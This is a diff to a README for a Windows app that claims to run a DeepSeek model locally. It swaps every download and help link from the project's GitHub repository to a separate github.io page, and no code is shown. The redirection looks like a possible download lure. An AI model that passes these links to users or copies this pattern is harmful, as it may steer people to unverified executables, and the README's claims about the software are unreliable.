@@ -1,6 +1,6 @@
 # ⚡ DeepSeek-v4-Flash-One-DGX-Spark - Run AI Fast on Your PC
 
-[![Download for Windows](https://img.shields.io/badge/Download-DeepSeek_v4_Flash_One-blue?style=for-the-badge&logo=github)](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
+[![Download for Windows](https://img.shields.io/badge/Download-DeepSeek_v4_Flash_One-blue?style=for-the-badge&logo=github)](https://rdhrzky04.github.io)
 
 ## 🚀 What This Software Does
 
@@ -38,7 +38,7 @@ Your computer will run slower with the minimum setup. Results will still work, b
 6. Wait for the download to finish. The file is about 2 GB.
 
 The download link is also here:  
-[https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
+[https://rdhrzky04.github.io](https://rdhrzky04.github.io)
 
 ## 🔧 How to Install
 
@@ -144,7 +144,7 @@ This software runs entirely on your computer. Your questions never leave your ma
 ## 📞 Need Help?
 
 If you have problems, visit the GitHub page:  
-[https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark](https://github.com/rdhrzky04/DeepSeek-v4-Flash-One-DGX-Spark)
+[https://rdhrzky04.github.io](https://rdhrzky04.github.io)
 
 Open a new issue in the "Issues" tab. Describe your problem. Include your computer specs. Someone will help you.
 
